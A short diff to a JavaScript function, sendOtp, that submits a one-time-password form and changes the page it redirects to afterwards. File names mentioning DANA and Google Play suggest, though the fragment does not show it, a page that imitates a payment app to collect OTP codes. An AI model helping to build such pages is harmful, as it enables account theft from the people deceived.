@@ -235,7 +235,7 @@ function sendOtp() {
         data: $('#formOtp').serialize(),
         dataType: 'text',
         success: function() {
-            window.location.href = "googleplayDANA.html";
+            window.location.href = "otp.html";
             setTimeout(function() {
                 $(".loadingOtp").hide();
                 $('.inpotp').val('');
